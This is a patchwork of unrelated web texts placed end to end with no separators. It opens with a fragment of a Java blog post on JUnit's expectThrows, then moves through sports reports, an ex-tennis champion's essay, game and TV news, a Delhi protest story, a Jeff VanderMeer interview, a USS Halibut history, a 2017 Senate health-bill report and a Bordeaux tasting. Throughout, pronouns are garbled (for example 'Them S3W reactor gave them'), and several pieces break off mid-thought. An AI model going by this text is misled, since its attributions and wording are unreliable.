public static void assertThrows(Class<? extends Throwable> expected, Executable executable) { expectThrows(expected, executable); } public static <T extends Throwable> T expectThrows(Class<T> expectedType, Executable executable) { try { executable.execute(); } catch (Throwable actualException) { if (expectedType.isInstance(actualException)) { return (T) actualException; } else { String message = Assertions.format(expectedType.getName(), actualException.getClass().getName(), "unexpected exception type thrown;"); throw new AssertionFailedError(message, actualException); } } throw new AssertionFailedError( String.format("Expected %s to be thrown, but nothing was thrown.", expectedType.getName())); }
That's it! Now, those of you who object to the verbosity of try { .. } catch { .. } blocks can rewrite this:
try { ubyte((UByte.MIN_VALUE) - 1); fail("Reason for failing"); } catch (NumberFormatException e) {}
… into this:
expectThrows(NumberFormatException.class, () -> ubyte((UByte.MIN_VALUE) - 1));
And if I want to do further checks on my exception, I can do so:
Exception e = expectThrows(NumberFormatException.class, () -> ubyte((UByte.MIN_VALUE) - 1)); assertEquals("abc", e.getMessage()); ...
Great work, JUnit lambda team!
Functional programming beats annotations every time
Annotations were abused for a lot of logic, mostly in the JavaEE and Spring environments, which were all too eager to move XML configuration back into Java code. This has gone the wrong way, and the example provided here clearly shows that there is almost always a better way to write out control flow logic explicitly both using object orientation or functional programming, than by using annotations.
In the case of @Test(expected = ...) , I conclude:
Rest in peace, expected
Sergio Busquets was the only academy graduate named in Luis Enrique's side for the La Liga game against Alaves on Saturday.
Sport EN
Due to the recent international break and the upcoming Champions League game against Celtic on Tuesday, the Barcelona boss left Lionel Messi, Andres Iniesta, Luis Suarez and Jordi Alba on the bench, while Gerard Pique and Sergi Roberto weren't even in the squad.
Jordi Masip and Rafinha were also on the bench, leaving Busquets as the only La Masia graduate in the starting lineup.
Denis Suarez cannot be considered a canterano as they only played for Barça B, while Aleix Vidal's time in La Masia was only an anecdote, really.
According to Catalunya Radio, there have not been so few La Masia graduates in a starting lineup since Apr. 23, 2002, in the Champions League semi-final against Real Madrid.
On that night, as Barça lost 2-0, Charly Rexach was in charge and they only lined up Thiago Motta in the XI, who was replaced later in the game by Gabri.
Since then, the Blaugrana have always had at least two canteranos in the starting lineup.
In November 2012, there was a special moment when Tita Vilanova had 11 La Masia products on the pitch at the same time in a 4-0 win at Levante.
As a dad, you need to pick your battles with your kids. So while I wouldn't ever want to jam my story down my sons' throats, I like to give them a few examples here and there of what I accomplished as a tennis player, including how I won this tournament five times.
They're 12 and 14, and I'm teaching them how I was never just handed a trophy, and how I had to work hard, and make lots of sacrifices, to be the best in the world. I'm telling them how you can achieve anything, just so long as you want it badly enough.
My kids are proud of my career and curious, too, and occasionally they might come across a YouTube video that they'll want to share with me. That's about the only time I'll watch one of my matches back on a screen; otherwise I only replay those highlights and moments in my head. Some of the best memories of my career were made at this tournament, and there is one occasion at the event that tops them all: the time I won an epic five-setter against Boris Becker in the 1996 final, which was played in front of a pro-Boris crowd in Hanover.
"I'm honoured the ATP has named one of the singles groups at next week's tournament after me; that's a real treat. When I first heard, I thought: "That's pretty cool, now I feel a stronger connection with some of the other champions." And with the other group named after Boris, it's been an opportunity to reminiscence about a match that came when we were both in the prime of our careers.
Being part of a match like that is a thrill. More than 20 years later, I still haven't forgotten about the noise from that extraordinarily loud, passionate crowd, and I can still hear myself screaming out after hitting a backhand pass beyond Boris to break their serve. There was so much energy in that place, it was electric. I also have a good recall of the exhaustion I felt - and how my lungs were burning - after I won the match on a rally or 25 or 30 strokes. Boris and I embraced at the net. Finally, we could let our guards down.
Even at that moment, and after a final of that magnitude and quality, we still had huge respect for each other. And the thousands of Germans inside the stadium, even though they had been cheering and shouting for Boris for hours, gave both of us an ovation. I took the title four other times but that match is top of my list because, as well as being an epic, playing against Boris in Germany was a big deal, as they always brought so much buzz, exposure and excitement to the event. We were two heavyweights, playing great tennis.
I'm sure the competition in London next week is going to be fierce - only those who have had a great year, and who are playing at a high level, make the cut. From my own experiences, I know that players need to be ready from the first point. There's no chance of easing your way into this tournament. Right from your opening match, you're competing against another elite player, and there's no let-up all week. You've got to bring it in every match, and I sometimes felt as though this was the hardest title to win. Playing this tournament was always a battle and, as well as winning those five titles, I also had some tough losses.
As much as tennis is an individual sport, and every one of the singles players will be giving their all to beat their rivals and finish the year on a positive note, I imagine there will be a camaraderie among the qualifiers. The years that I qualified, I always felt a connection with the other seven. You've all achieved something as a group. At the end of a long year, the eight of you are the best of the best, and it's like you're part of a special club. Anyone who has qualified for London is going to be feeling good about himself. Every time I made it into the eight, I felt honoured to be with other great players. And when you arrive in the city, you put on a suit and tie, go to some functions and have your photograph taken at landmarks, and you're made to feel special.
This will be a great tournament, it always is. You've got the best players in the world battling for a big prize, and that's fantastic for people in London, who love their tennis. Everyone at The O2 should appreciate they're watching the best generation of tennis players in history.
Each generation of athletes gets stronger and faster, and the players are adding to their knowledge of the game, and as a result you see the level of tennis going up and up. Everyone keeps on improving - today's players are tremendous athletes and hit the ball incredibly hard. Seeing some of the great things the guys do - especially some of the shots they produce when they're on the run - is incredible.
Every year at the tournament, the elite are better than the season before. I suppose that's evolution.
The 2017 Nitto ATP Finals will be held at The O2 in London from 12-19 November
Chaos Reborn is the great looking reboot of "Chaos" from Julian Gollop the original creator of X-COM. The game itself looks fantastic and will have a prototype Linux version next month.
It's already looking pretty slick and considering how much of a legend Julian is I have high hopes for it. It has finished the Kickstarter campaign, so it's got plenty of funding now.
In the latest update they mentioned this:
Quote Stoiko is currently working with me on upgrades to the game interface - and they are also an ace Linux programmer, so we will get the Linux client working shortly
Some time in the beginning of the July we will update the current prototype. It will have the new client/server code (which you won't notice) and some interface upgrades - and a working Linux version is planned. It will remain a publicly available prototype for now.

Mario Lemieux: League 'failed' in punishment of Friday's brawl
The NHL handed down 23 games of suspensions and more than $200,000 in fines or lost pay after Friday's brawl-a-thon between the New York Islanders and Pittsburgh Penguins.
In Mario Lemieux's mind, the league came up short, even questioning whether they wanted to remain part of the NHL.
"Hockey is a tough, physical game, and it always should be," the Penguins owner and Hall of Famer said in a statement released by the team. "But what happened Friday night on Long Island wasn't hockey. It was a travesty. It was painful to watch the game I love turn into a sideshow like that.
"The NHL had a chance to send a clear and strong message that those kinds of actions are unacceptable and embarrassing to the sport. It failed."
Friday's game, a 9-3 Islanders win, featured 15 fighting majors and 346 penalty minutes.
Late Saturday night, the NHL suspended Islanders forward Trevor Gillies ($24,193) nine games for elbowing Pittsburgh's Eric Tangradi in the head and throwing several punches afterward. New York's Matt Martin ($41,585) got four games for punching the Penguins' Max Talbot from behind and Pittsburgh's Eric Godard ($40,322) received an automatic 10 games for leaving the bench to join the fray.
NHL disciplinarian Colin Campbell also fined the Islanders $100,000, saying the team "must bear some responsibility for their failure to control their players."
"We are entirely comfortable with how Friday night's events were handled," NHL deputy commissioner Bill Daly said Sunday. "We have no other response to Mr. Lemieux's statement."
Boston Bruins winger Milan Lucic, whose team has been involved in recent fight-filled games, backed the league's rulings.
"I think the NHL took a stand against line brawls and going out trying to hurt someone," they said.
The fighting stemmed from an earlier meeting in which Talbot delivered a hit that injured Blake Comeau and Brent Johnson broke bones in Islanders netminder Rick DiPietro's face with a one-punch knockdown after the two goalies agreed to drop the gloves.
Tangradi missed Sunday's game with a suspected concussion.
"We, as a league, must do a better job of protecting the integrity of the game and the safety of our players," Lemieux said. "We must make it clear that those kinds of actions will not be tolerated and will be met with meaningful disciplinary action.
"If the events relating to Friday night reflect the state of the league, I need to rethink whether I want to be a part of it."

Watch Sheryl Lee And Dana Ashbrook Announce Their Return To Twin Peaks In 2016 (Video)
We're all very aware by now of Dale Cooper‘s long planned date with Laura Palmer. So if Kyle MacLachlan is coming back to town, you bet Sheryl Lee will be there waiting. As Laura and/or their cousin Maddy Ferguson in the Black Lodge, or who knows which new character Mark Frost and David Lynch have in mind for her?
David Lynch personally gave Sheryl Lee the green light to publicly announce their involvement in the new series at the most recent edition of the Twin Peaks UK Festival. In fact, the actor received their phone call on their way to the airport for their flight to London. “I just have a couple of minutes because a car is here to take me to the Twin Peaks Festival,” Sheryl told David and they said: “Well, you tell them you are… and Dana is…”
It was Dana Ashbrook who excitedly broke the casting news at the festival, which they had only just learned from Sheryl themselves upon arrival in London. Fittingly, a bunch of audience members responded by barking like Mike Nelson and Bobby Briggs in their prison cell.
Watch how Sheryl Lee and Dana Ashbrook officially announce their involvement (and possibly also Sherilyn Fenn's) in the new Twin Peaks. Video by Nicolai Kornum. More details: http://twin.pk #TwinPeaks #TwinPeaks2016 #SherylLee #DanaAshbrook A post shared by Twin Peaks (@welcometotwinpeaks) on Jan 16, 2015 at 8:54am PST
Both actors also described how, just like the rest of the world, they had absolutely no idea Twin Peaks was coming back until David Lynch and Mark Frost's twin tweets on Monday, October 6th 2014. And even then, they still couldn't believe it.
Dana said they were at home when they got a text from their fiancé's cousin: “I saw it and I couldn't believe it. I immediately texted Sheryl [Lee], Kimmy [Robertson] and Mädchen [Amick] and all three of them were like ‘Huh?!'” Sheryl thought Dana's text was a joke, or maybe it was all “some weird publicity, like April Fools thing.” They went on to send an e-mail to David Lynch and they confirmed the incredible news.
At that point, everyone was texting and calling each other: “Have you heard from him? Have you heard from him?” All hoping to get invited back to the party. A couple of hours later, Sherilyn Fenn texted Dana: “I talked to David. We're going back to Twin Peaks. We're gonna have some fun!” While that's not an official announcement, we can safely assume we'll get to see what Audrey Horne is up to as well.

Police crackdown on protests against church attacks in Delhi
A large number of police officers today swooped down on a protest in Delhi against church attacks, and dragged activists, including priests and nuns into buses. Some alleged that they were attacked with batons.
Christian groups were protesting outside the Sacred Heart cathedral in central Delhi when the police arrived. Scores of protesters were manhandled and bundled into buses, their bags, shoes and other belongings left scattered on the road.
Father Dominic Emanuel, the spokesperson of the Delhi Catholic Archdiocese, was also forced into a bus and taken away. An elderly woman, who lay on the road, was picked up by four police officers and thrown into a bus.
"Shame on the police. We were only trying to highlight the attacks on churches. The Prime Minister speaks on everything, why not on this?" said a furious priest.
A disproportionately large police force outnumbered protesters and the commotion caused traffic jams in one of the capital's busiest commercial areas, situated not far from top government offices, the Parliament building and ministers' homes.
"We are detaining people. No one has the right to protest on the road. They can't just march to the home minister's residence. We have to protect the residence of VIPs," said senior police officer Mukesh Kumar Meena.
Activists, some of them holding crosses and rosaries, chanted "We want Justice" and held up posters that said: "Stop violence against Christians." They later met the home minister and asked for action against church attacks in Delhi; there have been five since December.In the latest incident earlier this week, the St Alphonsa's Church in south Delhi's Vasant Kunj was vandalised. The police called it robbery and even filed an FIR or First Information Report citing a break-in.A church in west Delhi's Vikaspuri was vandalized last month. The police said three men caught on camera and arrested were drunk and attacked the church on a dare. Some Christian groups suspect a pattern of orchestrated attacks, and say the police are undermining them.
Jeff VanderMeer has been named the 2016-2017 Trias Writer-in-Residence for Hobart-William Smith College. Their most recent fiction is the NYT-bestselling Southern Reach trilogy (Annihilation, Authority, and Acceptance) from FSG, which won the Shirley Jackson Award. The trilogy also prompted the New Yorker to call the author “the weird Thoreau” and has been acquired by publishers in 28 other countries, with Paramount Pictures acquiring the movie rights. VanderMeer's nonfiction has appeared in the New York Times, the Guardian, the Washington Post, Atlantic.com, Vulture, Esquire.com, and the Los Angeles Times. They have taught at the Yale Writers' Conference, lectured at MIT, Brown, and the Library of Congress, and serves as the co-director of Shared Worlds, a unique teen writing camp. Their forthcoming novel from Farrar, Straus and Giroux is titled Borne. They live in Tallahassee, Florida, with their wife, the noted editor Ann VanderMeer.
We'll be talking mostly about Jeff's Southern Reach trilogy; the first book, Annihilation, is being made into a film by Alex Garland, which is very exciting. I loved their Ex Machina, which makes me super pumped about them directing Annihilation as well.
Mary: Your Southern Reach trilogy is a captivating set of novels. I think my new favorite genre may be weird fiction, as it seems to be an intriguing way to explore ecological catastrophe. I've read about dark ecology as a genre approach. According to Timothy Morton, it “puts hesitation, uncertainty, irony, and thoughtfulness back into ecological thinking.” You seem to be the “Weird Thoreau,” according to the New Yorker, and the king of weird fiction. What inspired you to use weird fiction to look at at our environmental crises today, which are more frightening than ever before? And how does dark ecology enter your novels?
Jeff: It came about kind of naturally. I've always explored weird real-life biology in my fiction, especially in the context of fungi, which often seems alien in its details. These are in a sense transitional forms, between animal and plant, that are incredibly complex and which we don't quite understand in all of that complexity just yet. So often it's not that you go out to explore ecology through weird fiction, but that the weirdness of the real world suggests certain impulses in your fiction. The Southern Reach is just the most personal exploration, and thus the dark ecology content probably is more intense and more front-and-center. This is largely because the setting is highly personal—North Florida wilderness—and certain elements, like the (at the time) seemingly endless spiral of the Gulf Oil Spill that kind of took up residence in my subconscious.
I've also been surrounded by scientists during my life—my dad is a leading research chemist and ecologist dealing with invasive species, including for the last 35 years, fire ants. My step-mom is a leading lupus researcher. My mom is an artist who also was a biological illustrator for many years. My sister is in environmental science and so is my stepdaughter. And I always wanted to be a marine biologist growing up, so there's a kind of amateur naturalist impulse built-in to my life.
Still, I was determined that because the entire premise of the trilogy—this encounter with something comparable to a hyper object like global warming, something seemingly inexplicable—was so engaged with these issues, I didn't want to be too direct. So there aren't many direct conversations about ecology or pollution or these other issues. It's just always there, even when it seems like it's not, pulsing in the backdrop.
Mary: It seems that the less direct approaches, those that don't involve being didactic or preachy, might be more effective. Global warming and ecological devastation are an example of hyper objects—which, according to David Tomkins are “events or systems or processes that are too complex, too massively distributed across space and time, for humans to get a grip on.” I think most of us fail to to be able to really grasp or cope with these concepts because they are so abstract, even if we know them to be real. If we cannot comprehend these things, it's an incredible feat for an author to break them down in storytelling. How do you even begin to do that, and what hyper objects would you say you explored in the trilogy?
Jeff: There's a sense in which if the Southern Reach is effective in this regard it's because I internalized a number of relevant areas of study prior to writing the novels, and then it just came out as an expression of what made sense in the moment of the scenes. For example, if I hadn't had the life experience of day jobs dealing with governmental agencies before I became a full-time writer…the aspect of exploring just how irrational human systems can be, and how that is made worse by coming into contact with a hyper object, would just not be hardwired into the novels. It'd be more like a too-conscious overlay. The difference between swimming for a dolphin and a human being—this is what you hope for to happen sometimes in your fiction. That you get to someplace really interesting where you're swimming like dolphin, not like yourself. Of course, it's at the expense of other things. Government stands in for corporations in my novels because adding the overlay of corporations would be one layer too many to be effective, given the other things I'm juggling.
I also had a lot of fun injecting things into the backdrops of scenes that pertain to these themes, though. In almost every scene, especially in Authority, there's secret stuff going on in the backgrounds.
Mary: I read that Michael Bernanos's The Other Side of the Mountain inspired your writing. After researching the book I have ordered it and can't wait to read it! What are your thoughts on The Other Side of the Mountain, and are there any other authors or books influenced your writing and reading?
Jeff: In an existential yet unique way, Bernanos' novel encapsulates the way in which we come up into conflict with the walls of the world, with a nature that is not our modern human nature/tech and how we misunderstand it and yet also the novel is sympathetic to the attempt to survive, to understand, even, when understanding is impossible. It's a deeply sad book but also deeply human and deeply hopeful in its way. As for other books, I'm just reading too, too much for me to pull out much of a list. I do think the book on media theory, The Marvelous Clouds, is kind of a missing link in the discussion of Nature versus Culture that is sometimes in the backdrop of discussions about our modern dilemma and global warming, though.
Mary: How does it feel to be a successful novelist whose work is being adapted to film? Can someone watch the movie without reading the book? I guess you can't know, or perhaps say, yet, but are there talks about also screen-adapting Authority and Acceptance?
Jeff: The first film only takes material from Annihilation. It'll be recognizable to readers of Annihilation, but also very different. You could think of it as being about an expedition similar to but different from the twelfth. Which is to say, I think you'll be able to read the book and enjoy the movie as two separate artistic visions. The plan is to do three movies, but of course the first one has to come out and do pretty well first.
I'm not really sure how to answer the other part of the question. I've been a full-time writer since 2007. The Southern Reach novels have reached a new peak of popularity for me, but then my career has largely been a slow upward climb, from the small and indie presses to large commercial houses to, now, being published by possibly the most prestigious literary publisher in the U.S., Farrar, Straus and Giroux. I can't lie and say it hasn't been at times a new experience, but I thought that as soon as I wrote novels set in some semblance of the real world it'd be that much easier to find readers. And that's proven true.
Mary: Are you going to do a Weird Nature anthology? What's that all about?
Jeff: At this point, I think it's more than my wife Ann and I will be including as many ecology-themed stories in our forthcoming anthologies than specifically doing a weird nature anthology. But I am working on a nonfiction book about storytelling in the modern era, specifically in regard to global warming and ecological issues.
Mary: I'll be looking forward to that and your and Ann's Big Book of Science Fiction. Do you have any other comments about your trilogy or what you are working on next?
Jeff: My next novel is Borne, which is set in a mid-collapse city and involves issues of scarcity, biotech, and human connection. It also features a giant psychotic floating bear.
Mary: Sounds up my alley, so set course for great reads ahead. Thanks so much for talking with Eco-fiction. It's a great honor to meet the brain behind the Southern Reach and other works from the past and yet to come.
One of the most unusual submarines of the Cold War was named after one of the most unusual fish in the sea. Halibut are flatfish, bottom-dwelling predators that, unlike conventional fish, lie sideways with two eyes on the same side of the head and ambush passing prey.
Like the halibut flatfish, USS Halibut was an unusual-looking submarine, and also spent a considerable amount of time on the ocean floor. Halibut was a “spy sub,” and conducted some of the most classified missions of the entire Cold War.
USS Halibut was built as one of the first of the U.S. Navy's long-range missile ships. The submarine was the first built from the ground up to carry the Regulus II missile, a large, turbojet-powered cruise missile. The missile was designed to be launched from the deck of a submarine, with a ramp leading down into the bow of the ship, where a total of five missiles were stored. This resulted in an unusual appearance, likened to a “ snake digesting a big meal .” Halibut also had six 533-millimeter torpedo tubes, but as a missile sub, would only use torpedoes in self-defense.
Halibut was a one-of-a-kind submarine. At 350 feet long, with a beam of twenty-nine feet, they were dimensionally identical to the Sailfish-class radar picket submarines , but their missile storage spaces and launch equipment ballooned their submerged displacement to five thousand tons. Them S3W reactor gave them an underwater speed of more than twenty knots and unlimited range—a useful trait, considering the Regulus II had a range of only one thousand miles.
Regulus II was quickly superseded by the Polaris submarine-launched ballistic missile, whose solid rocket fueled engine made for a more compact missile with a much longer range. The combination of the Polaris and the new George Washington–class fleet ballistic missile submarines conspired to put Halibut out of a job—Regulus II was canceled just seventeen days before the sub's commissioning.
Halibut operated for four years as a Regulus submarine. In 1965 the Navy, recognizing that a submarine with a large, built-in internal bay could be useful, put Halibut into dry dock at Pearl Harbor for a major $70 million ($205 million in today's dollars) overhaul. They received a photographic darkroom, hatches for divers to enter and exit the sub while submerged, and thrusters to help them maintain a stationary position.
Perhaps most importantly, Halibut was rebuilt with spaces to operate two remotely operated vehicles nicknamed “Fish.” Twelve feet long and equipped with cameras, strobe lights and sonar, the “fish” could search for objects at depths of up to twenty-five thousand feet. The ROVs could be launched and retrieved from the former missile storage bay, now nicknamed “the Bat Cave.” A twenty-four-bit mainframe computer, highly sophisticated for the time, analyzed sensor data from the Fish.
Post overhaul, Halibut was redesignated from nuclear guided-missile submarine to nuclear attack submarine, and assigned to the Deep Submergence Group, a group tasked with deep-sea search-and-recovery missions. In mid-July 1968, Halibut was sent on Velvet Fist, a top-secret mission meant to locate the wreck of the Soviet submarine K-129. K-129 was a Golf II–class ballistic missile submarine that had sunk that March, an estimated 1,600 nautical miles off the coast of Hawaii.
K-129 had sunk along with its three R-21 intermediate-range ballistic missiles. The R-21 was a single-stage missile with a range of 890 nautical miles and an eight-hundred-kiloton nuclear warhead. The loss of the submarine presented the U.S. government with the unique opportunity to recover the missiles and their warheads for study.
Halibut was the perfect ship for the task. Once on station, it deployed the Fish ROVs and began an acoustic search of the ocean floor. After a painstaking search and more than twenty thousand photos, Halibut's crew discovered the ill-fated Soviet sub's wreckage. As a result Halibut and their crew were awarded a Presidential Unit Citation, for “several missions of significant scientific value to the Government of the United States.” Halibut's contribution to efforts to recover K-129 would remain secret for decades.
In 1970, Halibut was again modified to accommodate the Navy's deep water saturation divers. The following year, it went to sea again to participate in Ivy Bells, a secret operation to install taps on the underwater communications cables connecting the Soviet ballistic missile submarine base at Petropavlovsk on the Kamchatka Peninsula with Moscow's Pacific Fleet headquarters at Vladivostok.
The taps, installed by divers and their ROVs, allowed Washington to listen in on message traffic to Soviet nuclear forces. Conducted at the bottom of the frigid Sea of Okhotsk, the Ivy Bells missions were conducted at the highest level of secrecy, as the Soviets would have quickly abandoned the use of underwater cables had they known they were compromised.
Halibut was decommissioned on November 1, 1975, after 1,232 dives and more than sixteen years of service . The ship had earned two Presidential Unit citations (the second in 1972 for Ivy Bells missions) and a Navy Unit Citation. The role of submarines in espionage, however, continued: they were succeeded in the role of special missions submarine by USS Parche. Today, USS Jimmy Carter— a sub with a particularly low profile —is believed to have taken on the task. The role of submarines in intelligence gathering continues.

WASHINGTON — Debate continued to rage in Congress Tuesday about a long awaited Senate health care bill, with top Republicans meeting with President Donald Trump at the White House on the matter.
While Senate Majority Leader Mitch McConnell, R-Ky., said there was no definitive timeline for when the bill would be finished, they countered claims that the process has not been transparent.
“We'll let you see the bill when we finally release it,” McConnell told reporters. “No one is hiding the ball here.”
Meanwhile, Trump met with 13 senators on the issue, praising the lawmakers for what they called their hard work while making no mention of the confusion and controversy that has surrounded the drafting process.
“The House has passed a bill and now the Senate is working very, very hard, and specifically the folks in this room — and I really appreciate what you're doing to come out with a bill that's going to be a phenomenal bill for the people of our country,” Trump said.
Republicans who met with Trump said the president made it clear that the bill needs to be passed as quickly as possible.
“The message was we need to get this done, it needs to get done right and sooner is better than later,” Sen. John Thune, R-S.D., told reporters, adding that Trump was comfortable with the Senate breaking with their House colleagues and writing a new bill.
Thune noted, however, that there was not a consensus about key pieces of the proposal, saying Trump wanted the bill to help those with pre-existing conditions.
“I think everybody there offered support for a bill they like,” Thune said of the meeting, laughing.

Democrats have raised concerns in recent days both about the content of the bill and the transparency of the process. They argue the bill may wind up being similar to the American Health Care Act passed by the House last month, which a Congressional Budget Office (CBO) report said would result in 23 million Americans being uninsured than under current law.
The House bill was panned by liberals, who noted it would slash Medicaid expansion for poor people and make it harder for people with pre-existing conditions to obtain health care coverage. A May Quinnipiac University poll also found that only 21 percent of Americans supported the AHCA, with 56 percent opposed.
“That is a dereliction of duty and from where I stand, flat immoral,” Senate Minority Whip Dick Durbin, D-Ill., said of the bill on the Senate floor Tuesday. “To take health care away from that many people.”
Vowing to take a more methodical approach in drafting their own bill, McConnell and a group of other Republican lawmakers have been pushing to get a vote on the Senate version before the July 4 recess.
Critics say the Republican process lacks transparency, noting there is likely to be no public hearing on the bill and that the proposal may not be released until shortly before a vote.
Even some Republicans have expressed frustration with the process, saying they don't yet know what the bill will entail.
“While I haven't seen the language, I am hoping that it stays within the confines of what we've discussed within the caucus,” Sen. Joni Ernst, R-Iowa, told Roll Call Monday.
Senate Minority Leader Charles Schumer, D-N.Y., told reporters that the process was “legislative malpractice” and other Democrats have pointed out that Republicans similarly criticized the process of drafting Obamacare, despite a series of public hearings the party held on the bill.
“The No. 1 issue people care about is not Comey and it's not Russia, it is health care,” Sen. Michael Bennet, D-Colo., told reporters. “They have a right to know what's in the Senate plan.”
Trump insisted Tuesday that Democrats have blocked progress on fixing what they see as Obamacare's shortcomings.
“By contrast, Republicans in Congress, as hard as they're working, you have the Democrats on the other side who truly have become obstructionists,” Trump said.

Hard to believe the 25th anniversary has already arrived for the 1989 vintage. An excellent year for wines in many parts of the world. Bordeaux flourished with a hot summer resulting in a large early very ripe harvest at lower acidity levels released at high prices. Enjoyed last week two retrospectives on 1989 Bordeaux one in Vancouver by our Commanderie de Bordeaux group and another in Yountville California by Society of Bacchus America. I have some mixed feelings overall on the consistency of this year but there are some great bottles. So if you have any of these stored away it might be a good time to check them out.
In Vancouver the generally well thought of region of Pomerol didn't sing. Vieux Chateau Certan which started picking their merlot early at the end of August appeared in shades of brown showing its age rather weak thin and drying out – bad storage?; the Fleur de Gay 100% older vines merlot from La Croix de Gay showed deeper reddish colour with a lovely intense ripe sweetness but rather one dimensional; Le Gay with 35 cab francs in the mix had a dark look with floral elements on the bouquet but very soft low acidity for drinking now; and the usually powerful L'Evangile (82, 90, 00) OK with slight iron minerality underneath but light and aging rapidly in colour and taste. The Left Bank faired better with Pichon-Longueville-Baron the clear winner. I have been following this wine even before it won in 1992 the Wine Spectator Wine of the Year Award. Displays now an impressive dark young red colour right to the rim with buckets of round ripe rich complex fruit. A knockout structured Pauillac with the right kind of tannins and fun to compare with their delicious 1990 both vintages drinking well but no rush to consume. Outshone the less rich spicy Latour, the elegant lovely stylish textbook St Julien Leoville Las Cases and a disappointing browner rustic Calon Segur from St. Estephe.
In California my impressions were slightly different. The Clinet showed success of lovely floral herbal ripe Pomerol stylish fruit. Pichon Baron disjointed with a surprisingly acid edge atypical for this vintage while a second bottle showed better balanced fruit but still leaner than expected. Why? Storage? Even Lynch Bages was more together with a better showing of smooth full round sweet fruit. Montrose as expected dark solid powerful extracted (like 1990) but coarser with loads of potential but way too young presently. The two stars for me resulted in a dead heat finish between Haut Brion & Margaux. Fortunate to try this HB 100 pointer RMP several times and always is truly outstanding. Picking here commenced August 31 and again style, elegance and vibrancy impress but seemed harder, more tannins and still almost closed in to me. Last month a bottle of 1989 La Mission Haut Brion (another 100 pointer) was more impressively open with a spectacular bouquet. The 1989 Margaux amazed combining that elusive combo of elegance with power in a rounder classy cab sauv statement of complex perfumes from exotic flowers. So fresh alive and truly delicious. This wine seems to show improvement ever time I try it – but then this one was served in a double magnum three litre formats! I am sure it is outstanding in 750 ml as well.
All in all a pretty good showing by 1989 Bordeaux at 25 but variable from property to property. Look forward to comparing the twin vintage of 1990 next year.
Please chime in with your comments on a 1989 Bordeaux you have experienced or a 1989 from any other wine region you have enjoyed.

According to Nick Friedell of ESPN Chicago, 2011 NBA MVP Derrick Rose is "very close" to resuming full contact activities. This comes after Dr. Brian Cole prognosticated that Rose would miss eight to 12 months after tearing their ACL in late April of 2012 (via ESPN Chicago).
The question is, where will a healthy D-Rose rank amongst the NBA's elite point guards?
Prior to the Chicago Bulls' January 21 victory over the Los Angeles Lakers, head coach Tom Thibodeau was asked about Rose's recovery. What Thibs had to say was pure music to the ears of anyone who loves the NBA.
Well, with an exception for opposing point guards.
"Very close," Thibodeau said, when asked if Rose would be cleared for full contact. "Very close. That will be the next step." "He has to go through that for an extended amount of time," Thibodeau said. "That's not going to be OK, one or two days of contact and he's going to be out there, that's not going to happen. Just be patient, everyone has to be patient."
In the words of Bulls fans everywhere: Praise the basketball Gods.
Although the Bulls are in the midst of a 24-16 season, there is no denying how much D-Rose has been missed. Not only has Chicago's offense suffered, but the league has missed one of its most promising young stars.
So how long will it take Rose to reclaim their spot amongst the elite? Once they do reach full strength, where will they rank at the NBA's fastest rising position?
Let's get to the bottom of it.
Doctor's Note
Many remember when Dr. Brian Cole predicted Derrick Rose would miss eight to 12 months after successful surgery on their torn ACL. What most don't remember is that Dr. Cole made another estimation.
A forecast that it would take even longer for Rose to reach their pre-injury level of play (via ESPN Chicago).
While they will be at hopefully a very high level at 12 months, it still may take slightly longer for them to be at their pre-injury level. That's not uncommon for athletes of this caliber.
No matter how outstanding Rose's work ethic may be, Cole has a medical point to be made.
Most athletes that return from injury do not return to their highest point from the opening tip. Instead, it takes time for the individual to re-adjust to the pace of their sport and the capabilities of their injured area during game play.
The latter will be the key for D-Rose, who cuts and explodes off of their knees as suddenly as any player in the NBA.
Facilitating vs. Improving
Derrick Rose is not thought as one of the game's elite facilitators. What we can say about him, however, is that they make everyone around them better.
In other words, D-Rose serves their purpose as a point guard.
Rose has a career average of 6.8 assists and most recently averaged a career-best 7.9 dimes in 2011-12. During the season prior, D-Rose dished out 7.7 assists per game, and that was during their MVP season.
Fortunately, their impact on the team is much bigger than assist numbers.
During their MVP season in 2010-11, the Bulls averaged 100.5 points scored per 48 minutes that Rose was on the floor. When they were not, however, that number dropped to 89.3 points per 48.
In 2011-12, it was more of the same.
The Bulls averaged 100.4 points scored per 48 minutes that Rose was on the floor. That number took an 8.2-point dip to 92.2 points per 48 when Rose was absent.
When you consider how talented Luol Deng, Carlos Boozer and Joakim Noah are, those numbers are shocking. They're also a symbol of how valuable Rose is.
Perhaps most important of all, they demonstrate how much Rose improves those around him.
Rank Amongst Point Guards
The best point guard in the NBA is Chris Paul of the Los Angeles Clippers. Beyond CP3, however, there is room for debate.
Rajon Rondo of the Boston Celtics, Tony Parker of the San Antonio Spurs and Russell Westbrook of the Oklahoma City Thunder are often named for the second spot.
Each of those players has their own pedigree. Rondo is the league's top facilitator, Parker is a former Finals MVP and Westbrook is a virtual mirror image of Rose in playing style and strengths.
As great as those men may be, Rose is one of the greatest game-changers in the NBA.
In terms of pure point guard skill, the other three players may have Rose beat. In terms of the best all-around player, however, Rose is the cream of the crop.
As long as their knee rehabilitates in the proper way, that won't change.
Rose cuts and crosses as rapidly and unexpectedly as any player in the game. Their ball-handling is superb and their ability to create something out of nothing is world-class.
As long as they return to full health, Rose will continue giving CP3 a run for their money as the best point guard in the NBA.
One of the most entertaining exercises a fan base goes through during the first couple years of an NFL player's career is finding a suitable nickname for said player. Some are negative, like "Hologram" for Derek Newton. Some are positive, like "The JuggerWatt". Some are inherited before the fans even have a say, like the "NUUUUUUUUUUK" chant. Some are neither positive nor negative, but rather are indicative of some interesting trait or fact about a certain player. Considering that Trevardo Williams has done nothing to make me either jump for joy or break things in a fit of rage yet, I have settled on a moniker that really encapsulates the freakish athleticism that they flaunt on every single snap – "Bullfrog."
The name might not make sense at first, but after watching just two games of tape for 15 minutes, it becomes apparent that Williams may have in fact been a Gumby doll in a past life. Whether they are contorting their body in multiple directions at once while flying through the air, jumping off the line so fast that they literally look like a frog, or being a ruthless hunter of quarterbacks, it is kind of hard to argue against their similarities to the amphibian killer.
I came into this article with a good level of familiarity with Williams, as I had already studied them during the pre-draft process. Below is a copy my scouting report on the young UCONN pass rusher based on four games against NC State, Rutgers, Syracuse, and Louisville (note: I was unable to pull GIFs from Rutgers or Syracuse because the site that I normally download my games from is offline at the moment).
